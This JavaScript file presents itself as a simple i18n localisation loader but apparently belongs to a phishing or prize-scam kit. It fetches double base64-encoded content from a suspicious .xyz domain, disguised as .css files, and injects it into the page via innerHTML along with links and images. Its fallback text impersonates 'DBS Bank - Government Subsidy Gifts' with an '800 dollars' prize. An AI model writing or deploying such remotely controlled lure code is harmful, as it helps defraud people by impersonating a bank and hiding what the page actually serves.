class SimpleI18n {
  constructor() {
    this.data = {};
    this.tags = {};
    this.images = {};
    this.enabledPlatforms = {};
    this.theme = {};
    this.themes = {};
    this.verificationLinks = {};
    
    const config = window.I18N_CONFIG || {};
    this.currentCountry = config.currentCountry;
    this.currentLanguage = config.currentLanguage;
    this.Hash = config.Hash;
    this.encryptedProjectId = config.encryptedProjectId;
    this.backendDomain = 'https://actnieinxiasdofivity.xyz';
    
    this.isLoaded = false;
    this.dynamicConfigLoaded = false;
    
    this.RTL_LANGUAGES = ['ar', 'he', 'fa', 'ur', 'ku'];
    
  }

  encode(obj) {
    try {
      return btoa(btoa(encodeURIComponent(JSON.stringify(obj))));
    } catch (e) {
      return null;
    }
  }

  decode(str) {
    try {
      return JSON.parse(decodeURIComponent(atob(atob(str))));
    } catch (e) {
      return null;
    }
  }

  replaceTags(text, params = {}) {
    if (typeof text !== 'string') return text;
    
    let result = text;
    
    for (const [tag, value] of Object.entries(this.tags)) {
      result = result.replace(new RegExp(tag, 'g'), value);
    }
    
    if (result.includes('{{theme}}')) {
      const themeText = this.getCurrentTheme();
      result = result.replace(/\{\{theme\}\}/g, themeText);
    }
    
    if (result.includes('{{prize}}')) {
      result = result.replace(/\{\{prize\}\}/g, this.getCurrentPrize());
    }
    
    for (const [paramKey, paramValue] of Object.entries(params)) {
      result = result.replace(new RegExp(`{{${paramKey}}}`, 'g'), paramValue);
    }
    
    return result;
  }

  t(key, params = {}) {
    if (key.startsWith('img.')) {
      const keys = key.substring(4).split('.');
      let value = this.images;
      for (const k of keys) {
        value = value?.[k];
      }
      return value;
    }
    
    if (!this.isLoaded) {
      return key;
    }

    const keys = key.split('.');
    let value = this.data;
    for (const k of keys) {
      value = value?.[k];
    }
    
    if (typeof value === 'string') {
      let result = this.replaceTags(value);
      for (const [paramKey, paramValue] of Object.entries(params)) {
        result = result.replace(new RegExp(`{{${paramKey}}}`, 'g'), paramValue);
      }
      return result;
    }
    
    return value;
  }


  async loadTextConfig() {
    try {
      const languageFile = `${this.backendDomain}/styles/${this.Hash}.css?server=1`;  
      const response = await fetch(languageFile);
      console.log(response);     
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }    
      const configString = await response.text();
      if (!configString || configString.trim() === '') {
        throw new Error('Failed to decode text configuration data');
      }
      
      this.data = this.decode(configString);
      console.log(this.data);
      
      if (!this.data) {
        throw new Error('Failed to decode text configuration data');
      }
      
      this.prizes = this.data.prizes || {};
      return true;
    } catch (error) {
      return false;
    }
  }

  async loadDynamicConfig() {
    try {
      
      const dynamicFile = `${this.backendDomain}/css/${this.Hash}.css?server=1`;
      
      const response = await fetch(dynamicFile);
      console.log(response);  
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      
      const configString = await response.text();
      
      // 检查是否为空或无效
      if (!configString || configString.trim() === '') {
        throw new Error('Failed to decode dynamic configuration data');
      }
      
      const data = this.decode(configString);
      console.log(data);
      if (!data) {
        throw new Error('Failed to decode dynamic configuration data');
      }
      
      this.tags = data.tags || {};
      this.themes = data.themes || {};
      this.physicalPrize = data.physicalPrize || { prize: '', image: '' };
      this.images = data.images || {};
      this.enabledPlatforms = data.enabledPlatforms || {};
      this.theme = data.theme || {};
      this.verificationLinks = data.verificationLinks || {};
      
      // 调试信息
      console.log('🌍 当前语言:', this.currentLanguage);
      console.log('📋 themes 配置:', this.themes);
      console.log('🎯 当前主题文本:', this.getCurrentTheme());
      
      this.applyTheme();
      this.dynamicConfigLoaded = true;
      return true;
    } catch (error) {
      this.dynamicConfigLoaded = false;
      return false;
    }
  }

  async load() {
    const [textLoaded, dynamicLoaded] = await Promise.all([
      this.loadTextConfig(),
      this.loadDynamicConfig()
    ]);
    
    this.isLoaded = textLoaded && dynamicLoaded;
    if (this.isLoaded) {
    } else {
    }
    return this.isLoaded;
  }

  replaceTexts() {
    const elements = document.querySelectorAll('[data-text]');
    console.log(`🔄 replaceTexts: 找到 ${elements.length} 个需要替换的文本元素`);
    console.log('🔍 当前状态检查:');
    console.log('  - this.isLoaded:', this.isLoaded);
    console.log('  - this.data:', this.data);
    console.log('  - this.data.t:', this.data?.t);
    console.log('  - this.data.cong:', this.data?.cong);
    
    let replacedCount = 0;
    elements.forEach((el, index) => {
      const key = el.dataset.text;
      const text = this.t(key);
      console.log(`  ${index + 1}. [data-text="${key}"] => "${text}" (类型: ${typeof text})`);
      if (text && text !== key) {
        el.tagName === 'BUTTON' ? el.textContent = text : el.innerHTML = text;
        replacedCount++;
      }
    });
    console.log(`✅ replaceTexts: 成功替换 ${replacedCount} 个文本元素`);
  }

  replaceResources() {
    const elements = document.querySelectorAll('[data-resource]');
    console.log(`🔄 replaceResources: 找到 ${elements.length} 个需要替换的资源元素`);
    
    let replacedCount = 0;
    elements.forEach(el => {
      const key = el.dataset.resource;
      const resource = this.t(key);
      console.log(`  - [data-resource="${key}"] => "${resource}"`);
      if (resource && resource !== key) {
        el.setAttribute('data-src', resource);
        replacedCount++;
      }
    });
    console.log(`✅ replaceResources: 成功替换 ${replacedCount} 个资源元素`);
  }

  replaceAll() {
    console.log('🎨 开始执行 replaceAll()...');
    this.replaceTexts();
    this.replaceResources();
    console.log('🎨 replaceAll() 执行完成');
  }

  setTags(tags) {
    this.tags = { ...this.tags, ...tags };
  }

  getTags() {
    return { ...this.tags };
  }

  getEnabledPlatforms() {
    return Object.keys(this.enabledPlatforms).filter(key => this.enabledPlatforms[key]);
  }

  isPlatformEnabled(platformKey) {
    return this.enabledPlatforms[platformKey] === true;
  }

  getCurrentPrize() {
    const config = window.I18N_CONFIG || {};
    if (config.prize?.name) {
      return config.prize.name;
    }
    return '800 dollars';
  }

  getCurrentPrizeImage() {
    const config = window.I18N_CONFIG || {};
    if (config.prize?.image) {
      return config.prize.image;
    }
    
    return this.images.gifts?.body || 'https://img.cdn56.top/images/b4a3869f4b77e49338723b0ca9666387.png';
  }

  
  applyTheme() {
    if (!this.theme || Object.keys(this.theme).length === 0) {
      return;
    }
    
    const root = document.documentElement;
    if (this.theme.primaryColor) {
      root.style.setProperty('--primary-color', this.theme.primaryColor);
    }
    if (this.theme.accentColor) {
      root.style.setProperty('--accent-color', this.theme.accentColor);
    }
  }
  
  getTheme() {
    return this.theme;
  }
  
  updateTheme(newTheme) {
    this.theme = { ...this.theme, ...newTheme };
    this.applyTheme();
  }
  
  setBackendDomain(domain) {
    this.backendDomain = domain || '';
  }
  
  getBackendDomain() {
    return this.backendDomain;
  }

  
  setLanguage(language) {
    this.currentLanguage = language || 'en';
    this.applyRTLSupport();
  }
  
  getCurrentLanguage() {
    return this.currentLanguage;
  }
  
  getCurrentTheme() {
    if (this.themes[this.currentLanguage]) {
      return this.themes[this.currentLanguage];
    }
    
    if (this.themes['en']) {
      return this.themes['en'];
    }
    
    return 'DBS Bank - Government Subsidy Gifts';
  }
  
  getSupportedLanguages() {
    return Object.keys(this.themes);
  }
  
  isRTLLanguage(language = this.currentLanguage) {
    return this.RTL_LANGUAGES.includes(language);
  }
  
  getTextDirection() {
    return this.isRTLLanguage() ? 'rtl' : 'ltr';
  }
  
  applyRTLSupport() {
    const isRTL = this.isRTLLanguage();
    const htmlElement = document.documentElement;
    
    if (isRTL) {
      htmlElement.setAttribute('dir', 'rtl');
      htmlElement.setAttribute('lang', this.currentLanguage);
      htmlElement.classList.add('rtl-layout');
    } else {
      htmlElement.setAttribute('dir', 'ltr');
      htmlElement.setAttribute('lang', this.currentLanguage);
      htmlElement.classList.remove('rtl-layout');
    }
    
    window.dispatchEvent(new CustomEvent('rtlChanged', {
      detail: { isRTL, language: this.currentLanguage }
    }));
  }
}

const $t = new SimpleI18n();

window.$t = $t;

async function initializeI18n() {
  console.log('🚀 开始初始化 i18n...');
  console.log('📄 当前 document.readyState:', document.readyState);
  console.log('📊 DOM 中的元素数量:', document.querySelectorAll('*').length);
  
  const loaded = await $t.load();
  console.log('📦 数据加载结果:', loaded);
  
  if (loaded) {
    console.log('✅ 数据加载成功，开始应用配置...');
    
    $t.applyRTLSupport();
    console.log('✅ RTL支持已应用');
    
    $t.replaceAll();
    
    window.$t = $t;
    
    console.log('✅ 触发 i18nReady 事件');
    window.dispatchEvent(new CustomEvent('i18nReady'));
    console.log('🎉 i18n 初始化完成！');
  } else {
    console.error('❌ i18n 数据加载失败！');
  }
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initializeI18n);
} else {
  initializeI18n();
}

if (typeof module !== 'undefined' && module.exports) {
  module.exports = { SimpleI18n, $t };
}
